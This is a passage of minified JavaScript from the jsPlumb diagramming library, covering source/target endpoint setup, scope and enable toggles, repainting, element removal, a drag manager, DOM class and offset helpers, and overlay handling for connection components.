            return e.scope = e.scope || d.scope || f.Defaults.Scope, e[l] = b.wrap(e[l], j, !0), e.rank = d.rank || 0, h && (e[a.jsPlumb.dragEvents.over] = function () {
                return !0
            }), !1 === d.allowLoopback && (e.canDrop = function (a) {
                return a.getDragElement()._jsPlumbRelatedElement !== c.el
            }), f.initDroppable(c.el, e, "internal"), j
        };
        this.makeTarget = function (b, c, d) {
            var e = a.jsPlumb.extend({_jsPlumb: this}, d);
            a.jsPlumb.extend(e, c);
            for (var g = e.maxConnections || -1, h = function (b) {
                var c = m(b), d = c.id, h = a.jsPlumb.extend({}, e.dropOptions || {}),
                    i = e.connectionType || "default";
                this.targetEndpointDefinitions[d] = this.targetEndpointDefinitions[d] || {}, oa(d), c.el._isJsPlumbGroup && null == h.rank && (h.rank = -1);
                var j = {
                    def: a.jsPlumb.extend({}, e),
                    uniqueEndpoint: e.uniqueEndpoint,
                    maxConnections: g,
                    enabled: !0
                };
                e.createEndpoint && (j.uniqueEndpoint = !0, j.endpoint = f.addEndpoint(b, j.def), j.endpoint.setDeleteOnEmpty(!1)), c.def = j, this.targetEndpointDefinitions[d][i] = j, ta(c, e, h, !0 === e.isSource, !0), c.el._katavorioDrop[c.el._katavorioDrop.length - 1].targetDef = j
            }.bind(this), i = b.length && b.constructor !== String ? b : [b], j = 0, k = i.length; j < k; j++) h(i[j]);
            return this
        }, this.unmakeTarget = function (a, b) {
            var c = m(a);
            return f.destroyDroppable(c.el, "internal"), b || delete this.targetEndpointDefinitions[c.id], this
        }, this.makeSource = function (c, d, e) {
            var g = a.jsPlumb.extend({_jsPlumb: this}, e);
            a.jsPlumb.extend(g, d);
            var h = g.connectionType || "default", i = f.deriveEndpointAndAnchorSpec(h);
            g.endpoint = g.endpoint || i.endpoints[0], g.anchor = g.anchor || i.anchors[0];
            for (var j = g.maxConnections || -1, k = g.onMaxConnections, n = function (d) {
                var e = d.id, i = this.getElement(d.el);
                this.sourceEndpointDefinitions[e] = this.sourceEndpointDefinitions[e] || {}, oa(e);
                var m = {
                    def: a.jsPlumb.extend({}, g),
                    uniqueEndpoint: g.uniqueEndpoint,
                    maxConnections: j,
                    enabled: !0
                };
                g.createEndpoint && (m.uniqueEndpoint = !0, m.endpoint = f.addEndpoint(c, m.def), m.endpoint.setDeleteOnEmpty(!1)), this.sourceEndpointDefinitions[e][h] = m, d.def = m;
                var n = a.jsPlumb.dragEvents.stop, o = a.jsPlumb.dragEvents.drag,
                    p = a.jsPlumb.extend({}, g.dragOptions || {}), q = p.drag, r = p.stop, s = null, t = !1;
                p.scope = p.scope || g.scope, p[o] = b.wrap(p[o], function () {
                    q && q.apply(this, arguments), t = !1
                }), p[n] = b.wrap(p[n], function () {
                    if (r && r.apply(this, arguments), this.currentlyDragging = !1, null != s._jsPlumb) {
                        var a = g.anchor || this.Defaults.Anchor, b = s.anchor, c = s.connections[0],
                            d = this.makeAnchor(a, e, this), h = s.element;
                        if (null != d.positionFinder) {
                            var i = f.getOffset(h), j = this.getSize(h),
                                k = {left: i.left + b.x * j[0], top: i.top + b.y * j[1]},
                                l = d.positionFinder(k, i, j, d.constructorParams);
                            d.x = l[0], d.y = l[1]
                        }
                        s.setAnchor(d, !0), s.repaint(), this.repaint(s.elementId), null != c && this.repaint(c.targetId)
                    }
                }.bind(this));
                var u = function (c) {
                    if (3 !== c.which && 2 !== c.button) {
                        var m = this.sourceEndpointDefinitions[e][h];
                        if (m.enabled) {
                            if (e = this.getId(this.getElement(d.el)), g.filter) {
                                if (!1 === (b.isString(g.filter) ? sa(c, d.el, g.filter, this, g.filterExclude) : g.filter(c, d.el))) return
                            }
                            var n = this.select({source: e}).length;
                            if (m.maxConnections >= 0 && n >= m.maxConnections) return k && k({
                                element: d.el,
                                maxConnections: j
                            }, c), !1;
                            var o = a.jsPlumb.getPositionOnElement(c, i, l), q = {};
                            a.jsPlumb.extend(q, g), q.isTemporarySource = !0, q.anchor = [o[0], o[1], 0, 0], q.dragOptions = p, m.def.scope && (q.scope = m.def.scope), s = this.addEndpoint(e, q), t = !0, s.setDeleteOnEmpty(!0), m.uniqueEndpoint && (m.endpoint ? s.finalEndpoint = m.endpoint : (m.endpoint = s, s.setDeleteOnEmpty(!1)));
                            var r = function () {
                                f.off(s.canvas, "mouseup", r), f.off(d.el, "mouseup", r), t && (t = !1, f.deleteEndpoint(s))
                            };
                            f.on(s.canvas, "mouseup", r), f.on(d.el, "mouseup", r);
                            var u = {};
                            if (m.def.extract) for (var v in m.def.extract) {
                                var w = (c.srcElement || c.target).getAttribute(v);
                                w && (u[m.def.extract[v]] = w)
                            }
                            f.trigger(s.canvas, "mousedown", c, u), b.consume(c)
                        }
                    }
                }.bind(this);
                this.on(d.el, "mousedown", u), m.trigger = u, g.filter && (b.isString(g.filter) || b.isFunction(g.filter)) && f.setDragFilter(d.el, g.filter);
                var v = a.jsPlumb.extend({}, g.dropOptions || {});
                ta(d, g, v, !0, !0 === g.isTarget)
            }.bind(this), o = c.length && c.constructor !== String ? c : [c], p = 0, q = o.length; p < q; p++) n(m(o[p]));
            return this
        }, this.unmakeSource = function (a, b, c) {
            var d = m(a);
            f.destroyDroppable(d.el, "internal");
            var e = this.sourceEndpointDefinitions[d.id];
            if (e) for (var g in e) if (null == b || b === g) {
                var h = e[g].trigger;
                h && f.off(d.el, "mousedown", h), c || delete this.sourceEndpointDefinitions[d.id][g]
            }
            return this
        }, this.unmakeEverySource = function () {
            for (var a in this.sourceEndpointDefinitions) f.unmakeSource(a, null, !0);
            return this.sourceEndpointDefinitions = {}, this
        };
        var ua = function (a, c, d) {
            c = b.isArray(c) ? c : [c];
            var e = Y(a);
            d = d || "default";
            for (var f = 0; f < c.length; f++) {
                var g = this[c[f]][e];
                if (g && g[d]) return g[d].def.scope || this.Defaults.Scope
            }
        }.bind(this), va = function (a, c, d, e) {
            d = b.isArray(d) ? d : [d];
            var f = Y(a);
            e = e || "default";
            for (var g = 0; g < d.length; g++) {
                var h = this[d[g]][f];
                h && h[e] && (h[e].def.scope = c)
            }
        }.bind(this);
        this.getScope = function (a, b) {
            return ua(a, ["sourceEndpointDefinitions", "targetEndpointDefinitions"])
        }, this.getSourceScope = function (a) {
            return ua(a, "sourceEndpointDefinitions")
        }, this.getTargetScope = function (a) {
            return ua(a, "targetEndpointDefinitions")
        }, this.setScope = function (a, b, c) {
            this.setSourceScope(a, b, c), this.setTargetScope(a, b, c)
        }, this.setSourceScope = function (a, b, c) {
            va(a, b, "sourceEndpointDefinitions", c), this.setDragScope(a, b)
        }, this.setTargetScope = function (a, b, c) {
            va(a, b, "targetEndpointDefinitions", c), this.setDropScope(a, b)
        }, this.unmakeEveryTarget = function () {
            for (var a in this.targetEndpointDefinitions) f.unmakeTarget(a, !0);
            return this.targetEndpointDefinitions = {}, this
        };
        var wa = function (a, c, d, e, g) {
            var h, i, j, k = "source" === a ? this.sourceEndpointDefinitions : this.targetEndpointDefinitions;
            if (g = g || "default", c.length && !b.isString(c)) {
                h = [];
                for (var l = 0, n = c.length; l < n; l++) i = m(c[l]), k[i.id] && k[i.id][g] && (h[l] = k[i.id][g].enabled, j = e ? !h[l] : d, k[i.id][g].enabled = j, f[j ? "removeClass" : "addClass"](i.el, "jtk-" + a + "-disabled"))
            } else {
                i = m(c);
                var o = i.id;
                k[o] && k[o][g] && (h = k[o][g].enabled, j = e ? !h : d, k[o][g].enabled = j, f[j ? "removeClass" : "addClass"](i.el, "jtk-" + a + "-disabled"))
            }
            return h
        }.bind(this), xa = function (a, c) {
            return b.isString(a) || !a.length ? c.apply(this, [a]) : a.length ? c.apply(this, [a[0]]) : void 0
        }.bind(this);
        this.toggleSourceEnabled = function (a, b) {
            return wa("source", a, null, !0, b), this.isSourceEnabled(a, b)
        }, this.setSourceEnabled = function (a, b, c) {
            return wa("source", a, b, null, c)
        }, this.isSource = function (a, b) {
            return b = b || "default", xa(a, function (a) {
                var c = this.sourceEndpointDefinitions[m(a).id];
                return null != c && null != c[b]
            }.bind(this))
        }, this.isSourceEnabled = function (a, b) {
            return b = b || "default", xa(a, function (a) {
                var c = this.sourceEndpointDefinitions[m(a).id];
                return c && c[b] && !0 === c[b].enabled
            }.bind(this))
        }, this.toggleTargetEnabled = function (a, b) {
            return wa("target", a, null, !0, b), this.isTargetEnabled(a, b)
        }, this.isTarget = function (a, b) {
            return b = b || "default", xa(a, function (a) {
                var c = this.targetEndpointDefinitions[m(a).id];
                return null != c && null != c[b]
            }.bind(this))
        }, this.isTargetEnabled = function (a, b) {
            return b = b || "default", xa(a, function (a) {
                var c = this.targetEndpointDefinitions[m(a).id];
                return c && c[b] && !0 === c[b].enabled
            }.bind(this))
        }, this.setTargetEnabled = function (a, b, c) {
            return wa("target", a, b, null, c)
        }, this.ready = function (a) {
            f.bind("ready", a)
        };
        var ya = function (a, b) {
            if ("object" == typeof a && a.length) for (var c = 0, d = a.length; c < d; c++) b(a[c]); else b(a);
            return f
        };
        this.repaint = function (a, b, c) {
            return ya(a, function (a) {
                J(a, b, c)
            })
        }, this.revalidate = function (a, b, c) {
            return ya(a, function (a) {
                var d = c ? a : f.getId(a);
                f.updateOffset({elId: d, recalc: !0, timestamp: b});
                var e = f.getDragManager();
                e && e.updateOffsets(d), f.repaint(a)
            })
        }, this.repaintEverything = function () {
            var a, b = c();
            for (a in v) f.updateOffset({elId: a, recalc: !0, timestamp: b});
            for (a in v) J(a, null, b);
            return this
        }, this.removeAllEndpoints = function (a, b, c) {
            c = c || [];
            var d = function (a) {
                var e, g, h = m(a), i = v[h.id];
                if (i) for (c.push(h), e = 0, g = i.length; e < g; e++) f.deleteEndpoint(i[e], !1);
                if (delete v[h.id], b && h.el && 3 !== h.el.nodeType && 8 !== h.el.nodeType) for (e = 0, g = h.el.childNodes.length; e < g; e++) d(h.el.childNodes[e])
            };
            return d(a), this
        };
        var za = function (a, b) {
            f.removeAllEndpoints(a.id, !0, b);
            for (var c = f.getDragManager(), d = function (a) {
                c && c.elementRemoved(a.id), f.anchorManager.clearFor(a.id), f.anchorManager.removeFloatingConnection(a.id), f.isSource(a.el) && f.unmakeSource(a.el), f.isTarget(a.el) && f.unmakeTarget(a.el), f.destroyDraggable(a.el), f.destroyDroppable(a.el), delete f.floatingConnections[a.id], delete x[a.id], delete y[a.id], a.el && (f.removeElement(a.el), a.el._jsPlumb = null)
            }, e = 1; e < b.length; e++) d(b[e]);
            d(a)
        };
        this.remove = function (a, b) {
            var c = m(a), d = [];
            return c.text ? c.el.parentNode.removeChild(c.el) : c.id && f.batch(function () {
                za(c, d)
            }, !0 === b), f
        }, this.empty = function (a, b) {
            var c = [], d = function (a, b) {
                var e = m(a);
                if (e.text) e.el.parentNode.removeChild(e.el); else if (e.el) {
                    for (; e.el.childNodes.length > 0;) d(e.el.childNodes[0]);
                    b || za(e, c)
                }
            };
            return f.batch(function () {
                d(a, !0)
            }, !1 === b), f
        }, this.reset = function (a) {
            f.silently(function () {
                na = !1, f.removeAllGroups(), f.removeGroupManager(), f.deleteEveryEndpoint(), a || f.unbind(), this.targetEndpointDefinitions = {}, this.sourceEndpointDefinitions = {}, u.length = 0, this.doReset && this.doReset()
            }.bind(this))
        };
        var Aa = function (a) {
            a.canvas && a.canvas.parentNode && a.canvas.parentNode.removeChild(a.canvas), a.cleanup(), a.destroy()
        };
        this.clear = function () {
            f.select().each(Aa), f.selectEndpoints().each(Aa), v = {}, w = {}
        }, this.setDefaultScope = function (a) {
            return F = a, f
        }, this.setDraggable = T, this.deriveEndpointAndAnchorSpec = function (a, b) {
            for (var c = ((b ? "" : "default ") + a).split(/[\s]/), d = null, e = null, g = null, h = null, i = 0; i < c.length; i++) {
                var j = f.getType(c[i], "connection");
                j && (j.endpoints && (d = j.endpoints), j.endpoint && (e = j.endpoint), j.anchors && (h = j.anchors), j.anchor && (g = j.anchor))
            }
            return {endpoints: d || [e, e], anchors: h || [g, g]}
        }, this.setId = function (a, c, d) {
            var e;
            b.isString(a) ? e = a : (a = this.getElement(a), e = this.getId(a));
            var f = this.getConnections({source: e, scope: "*"}, !0),
                g = this.getConnections({target: e, scope: "*"}, !0);
            c = "" + c, d ? a = this.getElement(c) : (a = this.getElement(e), this.setAttribute(a, "id", c)), v[c] = v[e] || [];
            for (var h = 0, i = v[c].length; h < i; h++) v[c][h].setElementId(c), v[c][h].setReferenceElement(a);
            delete v[e], this.sourceEndpointDefinitions[c] = this.sourceEndpointDefinitions[e], delete this.sourceEndpointDefinitions[e], this.targetEndpointDefinitions[c] = this.targetEndpointDefinitions[e], delete this.targetEndpointDefinitions[e], this.anchorManager.changeId(e, c);
            var j = this.getDragManager();
            j && j.changeId(e, c), x[c] = x[e], delete x[e];
            var k = function (b, d, e) {
                for (var f = 0, g = b.length; f < g; f++) b[f].endpoints[d].setElementId(c), b[f].endpoints[d].setReferenceElement(a), b[f][e + "Id"] = c, b[f][e] = a
            };
            k(f, 0, "source"), k(g, 1, "target"), this.repaint(c)
        }, this.setDebugLog = function (a) {
            s = a
        }, this.setSuspendDrawing = function (a, b) {
            var c = D;
            return D = a, E = a ? (new Date).getTime() : null, b && this.repaintEverything(), c
        }, this.isSuspendDrawing = function () {
            return D
        }, this.getSuspendedAt = function () {
            return E
        }, this.batch = function (a, c) {
            var d = this.isSuspendDrawing();
            d || this.setSuspendDrawing(!0);
            try {
                a()
            } catch (a) {
                b.log("Function run while suspended failed", a)
            }
            d || this.setSuspendDrawing(!1, !c)
        }, this.doWhileSuspended = this.batch, this.getCachedData = X, this.timestamp = c, this.show = function (a, b) {
            return U(a, "block", b), f
        }, this.toggleVisible = W, this.toggleDraggable = V, this.addListener = this.bind;
        var Ba = [];
        this.registerFloatingConnection = function (a, c, d) {
            Ba[a.id] = c, b.addToList(v, a.id, d)
        }, this.getFloatingConnectionFor = function (a) {
            return Ba[a]
        }
    };
    b.extend(a.jsPlumbInstance, b.EventGenerator, {
        setAttribute: function (a, b, c) {
            this.setAttribute(a, b, c)
        }, getAttribute: function (b, c) {
            return this.getAttribute(a.jsPlumb.getElement(b), c)
        }, convertToFullOverlaySpec: function (a) {
            return b.isString(a) && (a = [a, {}]), a[1].id = a[1].id || b.uuid(), a
        }, registerConnectionType: function (b, c) {
            if (this._connectionTypes[b] = a.jsPlumb.extend({}, c), c.overlays) {
                for (var d = {}, e = 0; e < c.overlays.length; e++) {
                    var f = this.convertToFullOverlaySpec(c.overlays[e]);
                    d[f[1].id] = f
                }
                this._connectionTypes[b].overlays = d
            }
        }, registerConnectionTypes: function (a) {
            for (var b in a) this.registerConnectionType(b, a[b])
        }, registerEndpointType: function (b, c) {
            if (this._endpointTypes[b] = a.jsPlumb.extend({}, c), c.overlays) {
                for (var d = {}, e = 0; e < c.overlays.length; e++) {
                    var f = this.convertToFullOverlaySpec(c.overlays[e]);
                    d[f[1].id] = f
                }
                this._endpointTypes[b].overlays = d
            }
        }, registerEndpointTypes: function (a) {
            for (var b in a) this.registerEndpointType(b, a[b])
        }, getType: function (a, b) {
            return "connection" === b ? this._connectionTypes[a] : this._endpointTypes[a]
        }, setIdChanged: function (a, b) {
            this.setId(a, b, !0)
        }, setParent: function (a, b) {
            var c = this.getElement(a), d = this.getId(c), e = this.getElement(b), f = this.getId(e),
                g = this.getDragManager();
            c.parentNode.removeChild(c), e.appendChild(c), g && g.setParent(c, d, e, f)
        }, extend: function (a, b, c) {
            var d;
            if (c) for (d = 0; d < c.length; d++) a[c[d]] = b[c[d]]; else for (d in b) a[d] = b[d];
            return a
        }, floatingConnections: {}, getFloatingAnchorIndex: function (a) {
            return a.endpoints[0].isFloating() ? 0 : a.endpoints[1].isFloating() ? 1 : -1
        }
    });
    var p = new o;
    a.jsPlumb = p, p.getInstance = function (a, b) {
        var c = new o(a);
        if (b) for (var d in b) c[d] = b[d];
        return c.init(), c
    }, p.each = function (a, b) {
        if (null != a) if ("string" == typeof a) b(p.getElement(a)); else if (null != a.length) for (var c = 0; c < a.length; c++) b(p.getElement(a[c])); else b(a)
    }, "undefined" != typeof exports && (exports.jsPlumb = p)
}.call("undefined" != typeof window ? window : this), function () {
    var a = this, b = a.jsPlumbUtil, c = function (a, b) {
        if (null == b) return [0, 0];
        var c = h(b), d = g(c, 0);
        return [d[a + "X"], d[a + "Y"]]
    }, d = c.bind(this, "page"), e = c.bind(this, "screen"), f = c.bind(this, "client"), g = function (a, b) {
        return a.item ? a.item(b) : a[b]
    }, h = function (a) {
        return a.touches && a.touches.length > 0 ? a.touches : a.changedTouches && a.changedTouches.length > 0 ? a.changedTouches : a.targetTouches && a.targetTouches.length > 0 ? a.targetTouches : [a]
    }, i = function (a) {
        var b = {}, c = [], d = {}, e = {}, f = {};
        this.register = function (g) {
            var h, i = a.getId(g);
            b[i] || (b[i] = g, c.push(g), d[i] = {});
            var j = function (b) {
                if (b) for (var c = 0; c < b.childNodes.length; c++) if (3 !== b.childNodes[c].nodeType && 8 !== b.childNodes[c].nodeType) {
                    var k = jsPlumb.getElement(b.childNodes[c]), l = a.getId(b.childNodes[c], null, !0);
                    if (l && e[l] && e[l] > 0) {
                        h || (h = a.getOffset(g));
                        var m = a.getOffset(k);
                        d[i][l] = {id: l, offset: {left: m.left - h.left, top: m.top - h.top}}, f[l] = i
                    }
                    j(b.childNodes[c])
                }
            };
            j(g)
        }, this.updateOffsets = function (b, c) {
            if (null != b) {
                c = c || {};
                var e, g = jsPlumb.getElement(b), h = a.getId(g), i = d[h];
                if (i) for (var j in i) if (i.hasOwnProperty(j)) {
                    var k = jsPlumb.getElement(j), l = c[j] || a.getOffset(k);
                    if (null == k.offsetParent && null != d[h][j]) continue;
                    e || (e = a.getOffset(g)), d[h][j] = {
                        id: j,
                        offset: {left: l.left - e.left, top: l.top - e.top}
                    }, f[j] = h
                }
            }
        }, this.endpointAdded = function (c, g) {
            g = g || a.getId(c);
            var h = document.body, i = c.parentNode;
            for (e[g] = e[g] ? e[g] + 1 : 1; null != i && i !== h;) {
                var j = a.getId(i, null, !0);
                if (j && b[j]) {
                    var k = a.getOffset(i);
                    if (null == d[j][g]) {
                        var l = a.getOffset(c);
                        d[j][g] = {id: g, offset: {left: l.left - k.left, top: l.top - k.top}}, f[g] = j
                    }
                    break
                }
                i = i.parentNode
            }
        }, this.endpointDeleted = function (a) {
            if (e[a.elementId] && --e[a.elementId] <= 0) for (var b in d) d.hasOwnProperty(b) && d[b] && (delete d[b][a.elementId], delete f[a.elementId])
        }, this.changeId = function (a, b) {
            d[b] = d[a], d[a] = {}, f[b] = f[a], f[a] = null
        }, this.getElementsForDraggable = function (a) {
            return d[a]
        }, this.elementRemoved = function (a) {
            var b = f[a];
            b && (delete d[b][a], delete f[a])
        }, this.reset = function () {
            b = {}, c = [], d = {}, e = {}
        }, this.dragEnded = function (b) {
            if (null != b.offsetParent) {
                var c = a.getId(b), d = f[c];
                d && this.updateOffsets(d)
            }
        }, this.setParent = function (b, c, e, g, h) {
            var i = f[c];
            d[g] || (d[g] = {});
            var j = a.getOffset(e), k = h || a.getOffset(b);
            i && d[i] && delete d[i][c], d[g][c] = {
                id: c,
                offset: {left: k.left - j.left, top: k.top - j.top}
            }, f[c] = g
        }, this.clearParent = function (a, b) {
            var c = f[b];
            c && (delete d[c][b], delete f[b])
        }, this.revalidateParent = function (b, c, d) {
            var e = f[c];
            if (e) {
                var g = {};
                g[c] = d, this.updateOffsets(e, g), a.revalidate(e)
            }
        }, this.getDragAncestor = function (b) {
            var c = jsPlumb.getElement(b), d = a.getId(c), e = f[d];
            return e ? jsPlumb.getElement(e) : null
        }
    }, j = function (a) {
        return null == a ? null : a.replace(/^\s\s*/, "").replace(/\s\s*$/, "")
    }, k = function (a, b, c) {
        b = j(b), void 0 !== a.className.baseVal ? a.className.baseVal = b : a.className = b;
        try {
            var d = a.classList;
            if (null != d) {
                for (; d.length > 0;) d.remove(d.item(0));
                for (var e = 0; e < c.length; e++) c[e] && d.add(c[e])
            }
        } catch (a) {
            jsPlumbUtil.log("JSPLUMB: cannot set class list", a)
        }
    }, l = function (a) {
        return void 0 === a.className.baseVal ? a.className : a.className.baseVal
    }, m = function (a, c, d) {
        c = null == c ? [] : b.isArray(c) ? c : c.split(/\s+/), d = null == d ? [] : b.isArray(d) ? d : d.split(/\s+/);
        var e = l(a), f = e.split(/\s+/), g = function (a, b) {
            for (var c = 0; c < b.length; c++) if (a) -1 === f.indexOf(b[c]) && f.push(b[c]); else {
                var d = f.indexOf(b[c]);
                -1 !== d && f.splice(d, 1)
            }
        };
        g(!0, c), g(!1, d), k(a, f.join(" "), f)
    };
    a.jsPlumb.extend(a.jsPlumbInstance.prototype, {
        headless: !1,
        pageLocation: d,
        screenLocation: e,
        clientLocation: f,
        getDragManager: function () {
            return null == this.dragManager && (this.dragManager = new i(this)), this.dragManager
        },
        recalculateOffsets: function (a) {
            this.getDragManager().updateOffsets(a)
        },
        createElement: function (a, b, c, d) {
            return this.createElementNS(null, a, b, c, d)
        },
        createElementNS: function (a, b, c, d, e) {
            var f, g = null == a ? document.createElement(b) : document.createElementNS(a, b);
            c = c || {};
            for (f in c) g.style[f] = c[f];
            d && (g.className = d), e = e || {};
            for (f in e) g.setAttribute(f, "" + e[f]);
            return g
        },
        getAttribute: function (a, b) {
            return null != a.getAttribute ? a.getAttribute(b) : null
        },
        setAttribute: function (a, b, c) {
            null != a.setAttribute && a.setAttribute(b, c)
        },
        setAttributes: function (a, b) {
            for (var c in b) b.hasOwnProperty(c) && a.setAttribute(c, b[c])
        },
        appendToRoot: function (a) {
            document.body.appendChild(a)
        },
        getRenderModes: function () {
            return ["svg"]
        },
        getClass: l,
        addClass: function (a, b) {
            jsPlumb.each(a, function (a) {
                m(a, b)
            })
        },
        hasClass: function (a, b) {
            return a = jsPlumb.getElement(a), a.classList ? a.classList.contains(b) : -1 !== l(a).indexOf(b)
        },
        removeClass: function (a, b) {
            jsPlumb.each(a, function (a) {
                m(a, null, b)
            })
        },
        toggleClass: function (a, b) {
            jsPlumb.hasClass(a, b) ? jsPlumb.removeClass(a, b) : jsPlumb.addClass(a, b)
        },
        updateClasses: function (a, b, c) {
            jsPlumb.each(a, function (a) {
                m(a, b, c)
            })
        },
        setClass: function (a, b) {
            null != b && jsPlumb.each(a, function (a) {
                k(a, b, b.split(/\s+/))
            })
        },
        setPosition: function (a, b) {
            a.style.left = b.left + "px", a.style.top = b.top + "px"
        },
        getPosition: function (a) {
            var b = function (b) {
                var c = a.style[b];
                return c ? c.substring(0, c.length - 2) : 0
            };
            return {left: b("left"), top: b("top")}
        },
        getStyle: function (a, b) {
            return void 0 !== window.getComputedStyle ? getComputedStyle(a, null).getPropertyValue(b) : a.currentStyle[b]
        },
        getSelector: function (a, b) {
            return 1 === arguments.length ? null != a.nodeType ? a : document.querySelectorAll(a) : a.querySelectorAll(b)
        },
        getOffset: function (a, b, c) {
            a = jsPlumb.getElement(a), c = c || this.getContainer();
            for (var d = {
                left: a.offsetLeft,
                top: a.offsetTop
            }, e = b || null != c && a !== c && a.offsetParent !== c ? a.offsetParent : null, f = function (a) {
                null != a && a !== document.body && (a.scrollTop > 0 || a.scrollLeft > 0) && (d.left -= a.scrollLeft, d.top -= a.scrollTop)
            }.bind(this); null != e;) d.left += e.offsetLeft, d.top += e.offsetTop, f(e), e = b ? e.offsetParent : e.offsetParent === c ? null : e.offsetParent;
            if (null != c && !b && (c.scrollTop > 0 || c.scrollLeft > 0)) {
                var g = null != a.offsetParent ? this.getStyle(a.offsetParent, "position") : "static",
                    h = this.getStyle(a, "position");
                "absolute" !== h && "fixed" !== h && "absolute" !== g && "fixed" !== g && (d.left -= c.scrollLeft, d.top -= c.scrollTop)
            }
            return d
        },
        getPositionOnElement: function (a, b, c) {
            var d = void 0 !== b.getBoundingClientRect ? b.getBoundingClientRect() : {
                    left: 0,
                    top: 0,
                    width: 0,
                    height: 0
                }, e = document.body, f = document.documentElement, g = window.pageYOffset || f.scrollTop || e.scrollTop,
                h = window.pageXOffset || f.scrollLeft || e.scrollLeft, i = f.clientTop || e.clientTop || 0,
                j = f.clientLeft || e.clientLeft || 0, k = 0, l = 0, m = d.top + g - i + k * c,
                n = d.left + h - j + l * c, o = jsPlumb.pageLocation(a), p = d.width || b.offsetWidth * c,
                q = d.height || b.offsetHeight * c;
            return [(o[0] - n) / p, (o[1] - m) / q]
        },
        getAbsolutePosition: function (a) {
            var b = function (b) {
                var c = a.style[b];
                if (c) return parseFloat(c.substring(0, c.length - 2))
            };
            return [b("left"), b("top")]
        },
        setAbsolutePosition: function (a, b, c, d) {
            c ? this.animate(a, {
                left: "+=" + (b[0] - c[0]),
                top: "+=" + (b[1] - c[1])
            }, d) : (a.style.left = b[0] + "px", a.style.top = b[1] + "px")
        },
        getSize: function (a) {
            return [a.offsetWidth, a.offsetHeight]
        },
        getWidth: function (a) {
            return a.offsetWidth
        },
        getHeight: function (a) {
            return a.offsetHeight
        },
        getRenderMode: function () {
            return "svg"
        }
    })
}.call("undefined" != typeof window ? window : this), function () {
    "use strict";
    var a = this, b = a.jsPlumb, c = a.jsPlumbUtil, d = "__label", e = function (a, c) {
        var e = {cssClass: c.cssClass, labelStyle: a.labelStyle, id: d, component: a, _jsPlumb: a._jsPlumb.instance},
            f = b.extend(e, c);
        return new (b.Overlays[a._jsPlumb.instance.getRenderMode()].Label)(f)
    }, f = function (a, d) {
        var e = null;
        if (c.isArray(d)) {
            var f = d[0], g = b.extend({component: a, _jsPlumb: a._jsPlumb.instance}, d[1]);
            3 === d.length && b.extend(g, d[2]), e = new (b.Overlays[a._jsPlumb.instance.getRenderMode()][f])(g)
        } else e = d.constructor === String ? new (b.Overlays[a._jsPlumb.instance.getRenderMode()][d])({
            component: a,
            _jsPlumb: a._jsPlumb.instance
        }) : d;
        return e.id = e.id || c.uuid(), a.cacheTypeItem("overlay", e, e.id), a._jsPlumb.overlays[e.id] = e, e
    };
    b.OverlayCapableJsPlumbUIComponent = function (b) {
        a.jsPlumbUIComponent.apply(this, arguments), this._jsPlumb.overlays = {}, this._jsPlumb.overlayPositions = {}, b.label && (this.getDefaultType().overlays[d] = ["Label", {
            label: b.label,
            location: b.labelLocation || this.defaultLabelLocation || .5,
            labelStyle: b.labelStyle || this._jsPlumb.instance.Defaults.LabelStyle,
            id: d
        }]), this.setListenerComponent = function (a) {
            if (this._jsPlumb) for (var b in this._jsPlumb.overlays) this._jsPlumb.overlays[b].setListenerComponent(a)
        }
    }, b.OverlayCapableJsPlumbUIComponent.applyType = function (a, b) {
        if (b.overlays) {
            var c, d = {};
            for (c in b.overlays) {
                var e = a._jsPlumb.overlays[b.overlays[c][1].id];
                if (e) e.updateFrom(b.overlays[c][1]), d[b.overlays[c][1].id] = !0; else {
                    var f = a.getCachedTypeItem("overlay", b.overlays[c][1].id);
                    null != f ? (f.reattach(a._jsPlumb.instance, a), f.setVisible(!0), f.updateFrom(b.overlays[c][1]), a._jsPlumb.overlays[f.id] = f) : f = a.addOverlay(b.overlays[c], !0), d[f.id] = !0
                }
            }
            for (c in a._jsPlumb.overlays) null == d[a._jsPlumb.overlays[c].id] && a.removeOverlay(a._jsPlumb.overlays[c].id, !0)
        }
    }, c.extend(b.OverlayCapableJsPlumbUIComponent, a.jsPlumbUIComponent, {
        setHover: function (a, b) {
            if (this._jsPlumb && !this._jsPlumb.instance.isConnectionBeingDragged()) for (var c in this._jsPlumb.overlays) this._jsPlumb.overlays[c][a ? "addClass" : "removeClass"](this._jsPlumb.instance.hoverClass)
        }, addOverlay: function (a, b) {
            var c = f(this, a);
            return b || this.repaint(), c
        }, getOverlay: function (a) {
            return this._jsPlumb.overlays[a]
        }, getOverlays: function () {
            return this._jsPlumb.overlays
        }, hideOverlay: function (a) {
            var b = this.getOverlay(a);
            b && b.hide()
        }, hideOverlays: function () {
            for (var a in this._jsPlumb.overlays) this._jsPlumb.overlays[a].hide()
        }, showOverlay: function (a) {
            var b = this.getOverlay(a);
            b && b.show()
        }, showOverlays: function () {
            for (var a in this._jsPlumb.overlays) this._jsPlumb.overlays[a].show()
        }, removeAllOverlays: function (a) {
            for (var b in this._jsPlumb.overlays) this._jsPlumb.overlays[b].cleanup && this._jsPlumb.overlays[b].cleanup();
            this._jsPlumb.overlays = {}, this._jsPlumb.overlayPositions = null, a || this.repaint()
        }, removeOverlay: function (a, b) {
            var c = this._jsPlumb.overlays[a];
            c && (c.setVisible(!1), !b && c.cleanup && c.cleanup(), delete this._jsPlumb.overlays[a], this._jsPlumb.overlayPositions && delete this._jsPlumb.overlayPositions[a])
        }, removeOverlays: function () {
            for (var a = 0, b = arguments.length; a < b; a++) this.removeOverlay(arguments[a])
        }, moveParent: function (a) {
            if (this.bgCanvas && (this.bgCanvas.parentNode.removeChild(this.bgCanvas), a.appendChild(this.bgCanvas)), this.canvas && this.canvas.parentNode) {
                this.canvas.parentNode.removeChild(this.canvas), a.appendChild(this.canvas);
                for (var b in this._jsPlumb.overlays) if (this._jsPlumb.overlays[b].isAppendedAtTopLevel) {
                    var c = this._jsPlumb.overlays[b].getElement();
                    c.parentNode.removeChild(c), a.appendChild(c)
                }
            }
        }, getLabel: function () {
            var a = this.getOverlay(d);
            return null != a ? a.getLabel() : null
        }, getLabelOverlay: function () {
            return this.getOverlay(d)
        }, setLabel: function (a) {
            var b = this.getOverlay(d);
            if (b) a.constructor === String || a.constructor === Function ? b.setLabel(a) : (a.label && b.setLabel(a.label), a.location && b.setLocation(a.location)); else {
                var c = a.constructor === String || a.constructor === Function ? {label: a} : a;
                b = e(this, c), this._jsPlumb.overlays[d] = b
            }
            this._jsPlumb.instance.isSuspendDrawing() || this.repaint()
        }, cleanup: function (a) {
